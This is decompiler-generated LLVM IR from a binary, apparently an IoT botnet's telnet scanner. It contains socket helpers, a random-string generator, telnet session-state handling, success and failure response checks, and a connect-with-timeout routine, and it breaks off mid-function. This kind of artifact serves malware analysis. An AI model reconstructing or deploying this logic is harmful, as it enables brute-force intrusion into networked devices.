define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001e4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10001ecc4 = icmp sgt i32 %arg2, 0
  br i1 %v2_10001ecc4, label %dec_label_pc_10001e68, label %dec_label_pc_10001ed4

dec_label_pc_10001e68:                            ; preds = %entry, %dec_label_pc_10001e68
  %storemerge37 = phi i32 [ %v1_10001ebc, %dec_label_pc_10001e68 ], [ 0, %entry ]
  %v2_10001e74 = add i32 %storemerge37, %v0_10001e4c
  %v0_10001e78 = call i32 @rand_cmwc()
  store i32 %v0_10001e78, i32* %r3.global-to-local, align 4
  %v1_10001e8c = urem i32 %v0_10001e78, 26
  %fold = add nuw nsw i32 %v1_10001e8c, 65
  %v1_10001eb4 = trunc i32 %fold to i8
  %v3_10001eb4 = inttoptr i32 %v2_10001e74 to i8*
  store i8 %v1_10001eb4, i8* %v3_10001eb4, align 1
  %v1_10001ebc = add nuw nsw i32 %storemerge37, 1
  %v2_10001ecc = icmp slt i32 %v1_10001ebc, %arg2
  br i1 %v2_10001ecc, label %dec_label_pc_10001e68, label %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge

dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge: ; preds = %dec_label_pc_10001e68
  %v0_10001eec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001ed4

dec_label_pc_10001ed4:                            ; preds = %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge, %entry
  %v0_10001eec = phi i32 [ %v0_10001eec.pre, %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge ], [ %v0_10001e4c, %entry ]
  ret i32 %v0_10001eec

; uselistorder directives
  uselistorder i32 %v1_10001ebc, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001e4c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001e68, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10001f28.30 to i32), i32* @lr, align 4
  %v4_10001f24 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_10001f38 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10001f4c

dec_label_pc_10001f4c:                            ; preds = %entry, %dec_label_pc_10001f4c
  %storemerge618 = phi i32 [ 0, %entry ], [ %v1_10001f68, %dec_label_pc_10001f4c ]
  %v1_10001f54 = mul nuw nsw i32 %storemerge618, 4
  %v2_10001f58 = add i32 %v1_10001f54, %v2_10001f38
  %v2_10001f60 = inttoptr i32 %v2_10001f58 to i32*
  store i32 0, i32* %v2_10001f60, align 4
  %v1_10001f68 = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_10001f68, 32
  br i1 %tmp42, label %dec_label_pc_10001f4c, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f4c
  %v1_10001f80 = udiv i32 %arg1, 32
  %v1_10001f88 = mul nuw nsw i32 %v1_10001f80, 4
  %v2_10001f8c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10001f90 = add nuw nsw i32 %v1_10001f88, 32
  %v1_10001f94 = add i32 %v2_10001f90, %v2_10001f8c
  %v1_10001f98 = inttoptr i32 %v1_10001f94 to i32*
  %v2_10001f98 = load i32, i32* %v1_10001f98, align 4
  %v1_10001fa0 = urem i32 %arg1, 32
  %v3_10001fa8 = shl i32 1, %v1_10001fa0
  %v2_10001fac = or i32 %v2_10001f98, %v3_10001fa8
  store i32 %v2_10001fac, i32* %v1_10001f98, align 4
  %v1_10001fc8 = add i32 %arg1, 1
  %v2_10001fd4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268443632, i32* @lr, align 4
  %v5_10001fec = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_10001ffc = icmp sgt i32 %v5_10001fec, 0
  br i1 %v2_10001ffc, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_1000210c.preheader

dec_label_pc_1000210c.preheader:                  ; preds = %dec_label_pc_10001f7c
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_10002008:                            ; preds = %dec_label_pc_1000210c.preheader, %dec_label_pc_10002100
  %stack_var_-176.017 = phi i32 [ %v1_10002104, %dec_label_pc_10002100 ], [ %tmp25, %dec_label_pc_1000210c.preheader ]
  %v3_1000200c = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_10002024.33 to i32), i32* @lr, align 4
  %v4_10002020 = call i32 @sockprintf(i32 %v3_1000200c, i32 ptrtoint ([5 x i8]* @global_var_10013cbc.32 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_10001f38, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, %dec_label_pc_10002008
  %v3_1000204c.pre = phi i32 [ %v2_10001f38, %dec_label_pc_10002008 ], [ %v3_1000204c.pre.pre, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_1000206449 = phi i32 [ 1, %dec_label_pc_10002008 ], [ %v1_10002064, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_10002050 = mul nuw nsw i32 %v1_1000206449, 4
  %v2_10002054 = add i32 %v1_10002050, %v3_1000204c.pre
  %v2_1000205c = inttoptr i32 %v2_10002054 to i32*
  store i32 0, i32* %v2_1000205c, align 4
  %v1_10002064 = add nuw nsw i32 %v1_1000206449, 1
  %tmp44 = icmp ult i32 %v1_10002064, 32
  br i1 %tmp44, label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, label %dec_label_pc_10002078

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v3_1000204c.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002078:                            ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v2_10002094 = load i32, i32* %v1_10001f98, align 4
  %v2_100020a8 = or i32 %v2_10002094, %v3_10001fa8
  store i32 %v2_100020a8, i32* %v1_10001f98, align 4
  store i32 268443884, i32* @lr, align 4
  %v5_100020e8 = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_100020f8 = icmp sgt i32 %v5_100020e8, 0
  br i1 %v2_100020f8, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_10002100

dec_label_pc_10002100:                            ; preds = %dec_label_pc_10002078
  %v1_10002104 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10002104, 10
  br i1 %tmp45, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_100021a8.preheader:                  ; preds = %dec_label_pc_10002100, %dec_label_pc_10002078, %dec_label_pc_1000210c.preheader, %dec_label_pc_10001f7c
  %v2_10002134 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_100021a8

dec_label_pc_1000212c:                            ; preds = %dec_label_pc_100021a8
  %v3_10002130 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 268443980, i32* @lr, align 4
  %v4_10002148 = call i32 @__libc_recv(i32 %v3_10002130, i32 %v2_10002134, i32 1, i32 0)
  %v3_10002150 = icmp eq i32 %v4_10002148, 1
  br i1 %v3_10002150, label %dec_label_pc_10002170, label %dec_label_pc_10002158

dec_label_pc_10002158:                            ; preds = %dec_label_pc_1000212c
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_10002170:                            ; preds = %dec_label_pc_1000212c
  %v3_10002170 = load i8, i8* %stack_var_-32, align 1
  %v4_10002178 = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_10002170, i8* %stack_var_-180.0, align 1
  %v1_10002184 = add i32 %v4_10002178, 1
  %v5_10002188 = inttoptr i32 %v1_10002184 to i8*
  %v3_1000218c = load i8, i8* %stack_var_-32, align 1
  %v3_10002194 = icmp eq i8 %v3_1000218c, 10
  br i1 %v3_10002194, label %dec_label_pc_100021d0, label %dec_label_pc_1000219c

dec_label_pc_1000219c:                            ; preds = %dec_label_pc_10002170
  %v1_100021a0 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_100021a8

dec_label_pc_100021a8:                            ; preds = %dec_label_pc_100021a8.preheader, %dec_label_pc_1000219c
  %stack_var_-180.0 = phi i8* [ %v5_10002188, %dec_label_pc_1000219c ], [ %arg2, %dec_label_pc_100021a8.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_100021a0, %dec_label_pc_1000219c ], [ 0, %dec_label_pc_100021a8.preheader ]
  %v0_100021b0 = call i32 @__asm_mfcr()
  %v1_100021b4 = call i32 @__asm_rlwinm(i32 %v0_100021b0, i32 30, i32 31, i32 31)
  %v1_100021b8 = urem i32 %v1_100021b4, 256
  %v3_100021c8 = icmp eq i32 %v1_100021b8, 0
  br i1 %v3_100021c8, label %dec_label_pc_100021d0, label %dec_label_pc_1000212c

dec_label_pc_100021d0:                            ; preds = %dec_label_pc_100021a8, %dec_label_pc_10002170
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_100021a8 ], [ %v5_10002188, %dec_label_pc_10002170 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_100021e4:                            ; preds = %dec_label_pc_10002158, %dec_label_pc_100021d0
  %storemerge = phi i32 [ -1, %dec_label_pc_10002158 ], [ %stack_var_-184.0, %dec_label_pc_100021d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_10002188, { 1, 0 }
  uselistorder i32 %v1_10002104, { 1, 0 }
  uselistorder i32 %v1_10002064, { 1, 0 }
  uselistorder i32 %v2_10001fd4, { 1, 0 }
  uselistorder i32* %v1_10001f98, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_10001f38, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100021e4, { 1, 0 }
  uselistorder label %dec_label_pc_100021a8, { 1, 0 }
  uselistorder label %dec_label_pc_10002008, { 1, 0 }
  uselistorder label %dec_label_pc_10001f4c, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_10002220 = add i32 %arg1, 4
  %v2_10002220 = inttoptr i32 %v1_10002220 to i32*
  %v3_10002220 = load i32, i32* %v2_10002220, align 4
  store i32 %v3_10002220, i32* %stack_var_-20, align 4
  store i32 268444220, i32* @lr, align 4
  %v3_10002238 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_10002238
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268444316, i32* @lr, align 4
  %v4_10002298 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_100022b0 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_100022c0 = load i8, i8* %arg3, align 1
  %v3_100022c8 = icmp eq i8 %v3_100022c0, -1
  br i1 %v3_100022c8, label %dec_label_pc_100022d0, label %dec_label_pc_100022e4

dec_label_pc_100022d0:                            ; preds = %entry
  store i32 268444388, i32* @lr, align 4
  %v6_100022e0 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_100022e4

dec_label_pc_100022e4:                            ; preds = %entry, %dec_label_pc_100022d0
  %v3_100022f0 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_100022f8 = icmp ne i32 %v3_100022f0, 0
  %. = zext i1 %v3_100022f8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_100022e4, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_10002368 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10002368, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge

dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge: ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge, %entry
  %v3_10002380.pre = phi i32 [ %v2_10002368, %entry ], [ %v3_10002380.pre.pre, %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge ]
  %v1_1000239821 = phi i32 [ 1, %entry ], [ %v1_10002398, %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge ]
  %v1_10002384 = mul nuw nsw i32 %v1_1000239821, 4
  %v2_10002388 = add i32 %v1_10002384, %v3_10002380.pre
  %v2_10002390 = inttoptr i32 %v2_10002388 to i32*
  store i32 0, i32* %v2_10002390, align 4
  %v1_10002398 = add nuw nsw i32 %v1_1000239821, 1
  %tmp19 = icmp ult i32 %v1_10002398, 32
  br i1 %tmp19, label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge, label %dec_label_pc_100023ac

dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge
  %v3_10002380.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge

dec_label_pc_100023ac:                            ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge
  %v1_100023b0 = udiv i32 %arg1, 32
  %v1_100023b8 = mul nuw nsw i32 %v1_100023b0, 4
  %v2_100023bc = ptrtoint i32* %stack_var_-184 to i32
  %v2_100023c0 = add nuw nsw i32 %v1_100023b8, 8
  %v1_100023c4 = add i32 %v2_100023c0, %v2_100023bc
  %v1_100023c8 = inttoptr i32 %v1_100023c4 to i32*
  %v2_100023c8 = load i32, i32* %v1_100023c8, align 4
  %v1_100023d0 = urem i32 %arg1, 32
  %v3_100023d8 = shl i32 1, %v1_100023d0
  %v2_100023dc = or i32 %v2_100023c8, %v3_100023d8
  store i32 %v2_100023dc, i32* %v1_100023c8, align 4
  %v1_100023f8 = add i32 %arg1, 1
  %v2_10002400 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268444700, i32* @lr, align 4
  %v5_10002418 = call i32 @__libc_select(i32 %v1_100023f8, i32 %v2_10002368, i32 0, i32 0, i32 %v2_10002400)
  %v2_10002420 = icmp sgt i32 %v5_10002418, 0
  br i1 %v2_10002420, label %dec_label_pc_10002434, label %dec_label_pc_10002454

dec_label_pc_10002434:                            ; preds = %dec_label_pc_100023ac
  store i32 268444748, i32* @lr, align 4
  %v4_10002448 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_10002454

dec_label_pc_10002454:                            ; preds = %dec_label_pc_100023ac, %dec_label_pc_10002434
  %storemerge = phi i32 [ %v4_10002448, %dec_label_pc_10002434 ], [ 0, %dec_label_pc_100023ac ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10002398, { 1, 0 }
  uselistorder i32 %v2_10002368, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10002454, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10002494 = icmp eq i32 %arg2, 0
  br i1 %v3_10002494, label %dec_label_pc_1000249c, label %dec_label_pc_100024ac

dec_label_pc_1000249c:                            ; preds = %entry
  %v2_100024a0 = load i32, i32* %arg1, align 4
  store i32 268444844, i32* @lr, align 4
  %v1_100024a8 = call i32 @__libc_close(i32 %v2_100024a0)
  br label %dec_label_pc_100024ac

dec_label_pc_100024ac:                            ; preds = %entry, %dec_label_pc_1000249c
  %v2_100024b4 = add i32 %tmp, 16
  %v3_100024b4 = inttoptr i32 %v2_100024b4 to i32*
  store i32 0, i32* %v3_100024b4, align 4
  %v1_100024c4 = trunc i32 %arg2 to i8
  %v3_100024c4 = add i32 %tmp, 8
  %v4_100024c4 = inttoptr i32 %v3_100024c4 to i8*
  store i8 %v1_100024c4, i8* %v4_100024c4, align 1
  %v1_100024cc = add i32 %tmp, 24
  %v2_100024cc = inttoptr i32 %v1_100024cc to i32*
  %v3_100024cc = load i32, i32* %v2_100024cc, align 4
  store i32 268444900, i32* @lr, align 4
  %v3_100024e0 = call i32 @__GI_memset(i32 %v3_100024cc, i32 0, i32 1024)
  ret i32 %v3_100024e0

; uselistorder directives
  uselistorder label %dec_label_pc_100024ac, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000251c = inttoptr i32 %arg1 to i32*
  %v3_1000251c = call i32 @advance_state(i32* %v2_1000251c, i32 0)
  %v3_10002528 = add i32 %arg1, 9
  %v4_10002528 = inttoptr i32 %v3_10002528 to i8*
  store i8 1, i8* %v4_10002528, align 1
  ret i32 %v3_1000251c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000256c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_1002e1f4.37 to i32))
  ret i32 %v3_1000256c
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100025b8 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_1002e1d4.45 to i32))
  ret i32 %v3_100025b8

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268445180, i32* @lr, align 4
  %v1_100025f8 = call i32 @contains_success(i32 %arg1)
  %v3_10002600 = icmp eq i32 %v1_100025f8, 0
  br i1 %v3_10002600, label %dec_label_pc_10002608, label %dec_label_pc_10002630

dec_label_pc_10002608:                            ; preds = %entry
  store i32 268445200, i32* @lr, align 4
  %v1_1000260c = call i32 @contains_fail(i32 %arg1)
  %v3_10002614 = icmp ne i32 %v1_1000260c, 0
  %. = zext i1 %v3_10002614 to i32
  br label %dec_label_pc_10002630

dec_label_pc_10002630:                            ; preds = %dec_label_pc_10002608, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_10002608 ]
  ret i32 %storemerge
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_10002684

dec_label_pc_10002684:                            ; preds = %dec_label_pc_10002684, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_10002688, %dec_label_pc_10002684 ]
  %v1_10002688 = add i32 %stack_var_-36.0, 1
  %v1_10002694 = mul i32 %v1_10002688, 4
  %v2_100026a0 = add i32 %v1_10002694, %arg2
  %v1_100026a4 = inttoptr i32 %v2_100026a0 to i32*
  %v2_100026a4 = load i32, i32* %v1_100026a4, align 4
  %v3_100026a8 = icmp eq i32 %v2_100026a4, 0
  br i1 %v3_100026a8, label %dec_label_pc_10002708.preheader, label %dec_label_pc_10002684

dec_label_pc_10002708.preheader:                  ; preds = %dec_label_pc_10002684
  %v2_100027104 = icmp sgt i32 %v1_10002688, 0
  br i1 %v2_100027104, label %dec_label_pc_100026bc.lr.ph, label %dec_label_pc_10002720

dec_label_pc_100026bc.lr.ph:                      ; preds = %dec_label_pc_10002708.preheader
  %v3_100026e0 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_100026bc

dec_label_pc_100026bc:                            ; preds = %dec_label_pc_100026bc.lr.ph, %dec_label_pc_100026fc
  %storemerge27 = phi i32 [ 0, %dec_label_pc_100026bc.lr.ph ], [ %v1_10002700, %dec_label_pc_100026fc ]
  %v1_100026c0 = mul i32 %storemerge27, 4
  %v2_100026cc = add i32 %v1_100026c0, %arg2
  %v1_100026d0 = inttoptr i32 %v2_100026cc to i32*
  %v2_100026d0 = load i32, i32* %v1_100026d0, align 4
  store i32 268445412, i32* @lr, align 4
  %v4_100026e0 = call i32 @strcasestr(i8* %v3_100026e0, i32 %v2_100026d0, i32 %v2_100026cc)
  %v3_100026e8 = icmp eq i32 %v4_100026e0, 0
  br i1 %v3_100026e8, label %dec_label_pc_100026fc, label %dec_label_pc_10002720.loopexit

dec_label_pc_100026fc:                            ; preds = %dec_label_pc_100026bc
  %v1_10002700 = add nuw nsw i32 %storemerge27, 1
  %v2_10002710 = icmp slt i32 %v1_10002700, %v1_10002688
  br i1 %v2_10002710, label %dec_label_pc_100026bc, label %dec_label_pc_10002720.loopexit

dec_label_pc_10002720.loopexit:                   ; preds = %dec_label_pc_100026fc, %dec_label_pc_100026bc
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_100026bc ], [ 0, %dec_label_pc_100026fc ]
  br label %dec_label_pc_10002720

dec_label_pc_10002720:                            ; preds = %dec_label_pc_10002720.loopexit, %dec_label_pc_10002708.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10002708.preheader ], [ %storemerge.ph, %dec_label_pc_10002720.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_10002688, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100026bc, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268445560, i32* @lr, align 4
  %v2_10002774 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_100027a0.46 to i32), i32* @lr, align 4
  %v2_1000279c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_100027ac = urem i32 %arg3, 65536
  store i32 %v1_100027ac, i32* @r3, align 4
  %v1_100027b4 = call i32 @htons(i32 %v1_100027ac)
  %v2_100027c4 = ptrtoint i32* %stack_var_-200 to i32
  %v4_100027d4 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_100027c4)
  %v3_100027dc = icmp eq i32 %v4_100027d4, 0
  br i1 %v3_100027dc, label %dec_label_pc_100027f0, label %dec_label_pc_100027e4

dec_label_pc_100027e4:                            ; preds = %entry
  br label %dec_label_pc_100029b0

dec_label_pc_100027f0:                            ; preds = %entry
  store i32 268445724, i32* @lr, align 4
  %v3_10002818 = call i32 @__libc_connect(i32 %arg1, i32 %v2_100027c4, i32 16)
  %tmp26 = icmp sgt i32 %v3_10002818, -1
  br i1 %tmp26, label %dec_label_pc_1000296c, label %dec_label_pc_10002830

dec_label_pc_10002830:                            ; preds = %dec_label_pc_100027f0
  %v0_10002830 = call i32 @__errno_location()
  %v1_10002838 = inttoptr i32 %v0_10002830 to i32*
  %v2_10002838 = load i32, i32* %v1_10002838, align 4
  %v3_1000283c = icmp eq i32 %v2_10002838, 115
  br i1 %v3_1000283c, label %dec_label_pc_10002844, label %dec_label_pc_10002960

dec_label_pc_10002844:                            ; preds = %dec_label_pc_10002830
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_10002854 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_10002854, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge

dec_label_pc_10002868.dec_label_pc_10002868_crit_edge: ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge, %dec_label_pc_10002844
  %v3_1000286c.pre = phi i32 [ %v2_10002854, %dec_label_pc_10002844 ], [ %v3_1000286c.pre.pre, %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge ]
  %v1_1000288430 = phi i32 [ 1, %dec_label_pc_10002844 ], [ %v1_10002884, %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge ]
  %v1_10002870 = mul nuw nsw i32 %v1_1000288430, 4
  %v2_10002874 = add i32 %v1_10002870, %v3_1000286c.pre
  %v2_1000287c = inttoptr i32 %v2_10002874 to i32*
  store i32 0, i32* %v2_1000287c, align 4
  %v1_10002884 = add nuw nsw i32 %v1_1000288430, 1
  %tmp27 = icmp ult i32 %v1_10002884, 32
  br i1 %tmp27, label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge, label %dec_label_pc_10002898

dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge: ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge
  %v3_1000286c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge

dec_label_pc_10002898:                            ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge
  %v1_1000289c = udiv i32 %arg1, 32
  %v1_100028a4 = mul nuw nsw i32 %v1_1000289c, 4
  %v2_100028a8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_100028ac = add nuw nsw i32 %v1_100028a4, 32
  %v1_100028b0 = add i32 %v2_100028ac, %v2_100028a8
  %v1_100028b4 = inttoptr i32 %v1_100028b0 to i32*
  %v2_100028b4 = load i32, i32* %v1_100028b4, align 4
  %v1_100028bc = urem i32 %arg1, 32
  %v3_100028c4 = shl i32 1, %v1_100028bc
  %v2_100028c8 = or i32 %v2_100028b4, %v3_100028c4
  store i32 %v2_100028c8, i32* %v1_100028b4, align 4
  %v1_100028e4 = add i32 %arg1, 1
  %v2_100028ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 268445960, i32* @lr, align 4
  %v5_10002904 = call i32 @__libc_select(i32 %v1_100028e4, i32 0, i32 %v2_10002854, i32 0, i32 %v2_100028ec)
  %tmp28 = icmp slt i32 %v5_10002904, 1
  br i1 %tmp28, label %dec_label_pc_10002954, label %dec_label_pc_10002914

dec_label_pc_10002914:                            ; preds = %dec_label_pc_10002898
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000291c = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002920 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268446012, i32* @lr, align 4
  %v5_10002938 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_1000291c, i32 %v2_10002920)
  %v3_1000293c = load i32, i32* %stack_var_-44, align 4
  %v3_10002940 = icmp eq i32 %v3_1000293c, 0
  br i1 %v3_10002940, label %dec_label_pc_1000296c, label %dec_label_pc_10002948

